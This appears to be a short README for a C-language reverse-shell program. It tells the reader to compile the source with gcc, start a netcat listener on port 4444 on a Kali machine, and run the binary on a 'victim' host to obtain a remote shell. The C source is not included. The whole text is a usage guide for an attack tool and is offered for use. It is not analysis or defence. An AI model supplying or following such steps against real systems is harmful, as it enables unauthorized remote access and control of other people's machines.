# Netcat-ReverseShell-In-C-Programming
how to use:
#compile the script first
root@kali:~ gcc Nc-ReverseShell.c -o outputname

now open terminal and write this command:

root@kali:~ nc -lnp 4444 //your listen port you pested in your script

root@victim:~ ./outputname //your compiled script 

now u get a shell successfully:)
